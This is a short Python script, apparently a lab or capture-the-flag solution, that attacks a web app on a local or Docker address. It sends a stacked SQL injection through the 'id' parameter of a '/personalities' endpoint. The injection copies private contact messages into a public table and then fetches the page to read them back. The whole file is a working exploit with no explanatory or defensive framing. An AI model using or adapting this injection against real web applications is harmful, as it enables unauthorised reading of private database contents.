import urllib
import sys
import requests
from bs4 import BeautifulSoup

addr = "172.17.0.2" if len(sys.argv) > 1 else "127.0.0.1"


injection = requests.get('http://' + addr + '/personalities?id=' +urllib.parse.quote("'; insert into personalities(name) select message from contact_messages where mail='james@bond.mi5"))
retrieve = requests.get('http://' + addr + '/personalities')


print (BeautifulSoup(retrieve.text))

